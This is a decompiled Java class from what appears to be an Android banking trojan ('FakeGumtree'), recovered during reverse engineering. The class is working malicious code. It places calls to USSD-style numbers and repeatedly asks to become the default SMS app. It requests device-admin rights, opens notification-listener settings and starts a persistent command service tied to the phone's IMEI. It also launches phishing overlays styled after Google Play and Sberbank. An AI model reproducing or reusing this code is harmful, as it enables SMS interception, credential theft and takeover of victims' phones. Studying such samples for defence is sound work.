package com.gumsis.checktls;

import android.annotation.TargetApi;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build.VERSION;
import com.gumsis.Realtalk;
import com.gumsis.checkui.AdRequestDialog;
import com.gumsis.ds.AccOnDialog;
import com.gumsis.ds.StartDialog;
import com.gumsis.injs.g.GActivity;
import com.gumsis.injs.s.SSplashActivity;
import com.gumsis.srs.CmndSrs;
import com.gumsis.srs.StDlgSrs;
import com.gumsis.srs.newapi.utils.Util;
import com.gumsis.srs.rcv.AlarmBroadCastReceiver;
import com.gumsis.wb.WbActivity;
import java.util.Random;

public class IntTls
{
  public static final int REQUEST_CODE = 110;
  
  public static void callNumber(Context paramContext, String paramString)
  {
    String str = paramString;
    try
    {
      if (paramString.contains("#")) {
        str = paramString.replaceAll("#", Uri.encode("#"));
      }
      paramString = new Intent("android.intent.action.CALL", Uri.parse("tel:" + str));
      paramString.setFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      Print.e(paramContext.toString());
    }
  }
  
  @TargetApi(19)
  public static void chSSCl(Context paramContext)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramContext.getPackageName());
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chSSCl(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chSSCla(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chSSClaf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chSalaf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chSbClaf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chSbvClaf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chScclaf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chSfgf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chStttlaf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  @TargetApi(19)
  public static void chaaalaf(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
      localIntent.putExtra("package", paramString);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private static PendingIntent getAlarmCommandIntent(Context paramContext)
  {
    return PendingIntent.getBroadcast(paramContext, 134217728, new Intent(paramContext, AlarmBroadCastReceiver.class), 0);
  }
  
  public static void minimizeApp(Context paramContext)
  {
    try
    {
      Intent localIntent = new Intent("android.intent.action.MAIN");
      localIntent.setFlags(268468224);
      localIntent.addCategory("android.intent.category.HOME");
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startAdminRequest(Context paramContext)
  {
    try
    {
      Intent localIntent = new Intent(paramContext, AdRequestDialog.class);
      localIntent.setFlags(268468224);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private static void startAlarmCommandService(Context paramContext)
  {
    AlarmManager localAlarmManager;
    long l;
    try
    {
      localAlarmManager = (AlarmManager)paramContext.getSystemService("alarm");
      if (localAlarmManager == null) {
        return;
      }
      l = System.currentTimeMillis() + 60000L;
      if (Build.VERSION.SDK_INT >= 23)
      {
        localAlarmManager.setExactAndAllowWhileIdle(0, l, getAlarmCommandIntent(paramContext));
        return;
      }
      if (Build.VERSION.SDK_INT >= 19)
      {
        localAlarmManager.setExact(0, l, getAlarmCommandIntent(paramContext));
        return;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
      return;
    }
    localAlarmManager.set(0, l, getAlarmCommandIntent(paramContext));
  }
  
  public static void startCommandService(Context paramContext)
  {
    try
    {
      if (Realtalk.getPsuedoID(paramContext) == null)
      {
        long l = (new Random().nextDouble() * (999L - 100L));
        String str = CmndTls.getPhoneIMEINumber(paramContext);
        Realtalk.setPsuedoID(paramContext, str + String.valueOf(100L + l));
        if (!CmndTls.isMyServiceRunning(CmndSrs.class, paramContext))
        {
          paramContext.startService(new Intent(paramContext, CmndSrs.class));
          if (Util.useJobSchedule()) {
            Util.scheduleJob(paramContext);
          }
        }
      }
      else if (!CmndTls.isMyServiceRunning(CmndSrs.class, paramContext))
      {
        paramContext.startService(new Intent(paramContext, CmndSrs.class));
        if (Util.useJobSchedule())
        {
          Util.scheduleJob(paramContext);
          return;
        }
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startDialogAccOn(Context paramContext)
  {
    try
    {
      Intent localIntent = new Intent(paramContext, AccOnDialog.class);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startDialogAccess(Context paramContext)
  {
    try
    {
      Intent localIntent = new Intent(paramContext, StartDialog.class);
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startDialogAccessService(Context paramContext)
  {
    try
    {
      if ((Realtalk.isStartAccess(paramContext)) && (!CmndTls.isMyServiceRunning(StDlgSrs.class, paramContext)) && (Build.VERSION.SDK_INT >= 18)) {
        paramContext.startService(new Intent(paramContext, StDlgSrs.class));
      }
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  static void startGP(Context paramContext)
  {
    try
    {
      Intent localIntent = new Intent(paramContext, GActivity.class);
      localIntent.setFlags(268468224);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startNLSettings(Context paramContext)
    throws Exception
  {
    try
    {
      Intent localIntent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
      localIntent.setFlags(268435456);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  static void startSber(Context paramContext)
  {
    try
    {
      Intent localIntent = new Intent(paramContext, SSplashActivity.class);
      localIntent.setFlags(268468224);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startWb(Context paramContext, String paramString)
  {
    try
    {
      Intent localIntent = new Intent(paramContext, WbActivity.class);
      localIntent.setFlags(268468224);      // FLAG_ACTIVITY_CLEAR_TASK | FLAG_ACTIVITY_NEW_TASK (or FLAG_RECEIVER_FOREGROUND)
      localIntent.putExtra("url", paramString);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startWb(Context paramContext, String paramString1, String paramString2)
  {
    try
    {
      Intent localIntent = new Intent(paramContext, WbActivity.class);
      localIntent.setFlags(268468224);
      localIntent.putExtra("url", paramString1);
      localIntent.putExtra("currentPackage", paramString2);
      paramContext.startActivity(localIntent);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startoAdminAction(ComponentName paramComponentName, Activity paramActivity)
  {
    try
    {
      Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
      localIntent.putExtra("android.app.extra.DEVICE_ADMIN", paramComponentName);
      localIntent.putExtra("android.app.extra.ADD_EXPLANATION", paramActivity.getString(2131361807));
      paramActivity.startActivityForResult(localIntent, 110);
      return;
    }
    catch (Exception paramComponentName)
    {
      paramComponentName.printStackTrace();
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/IntTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */
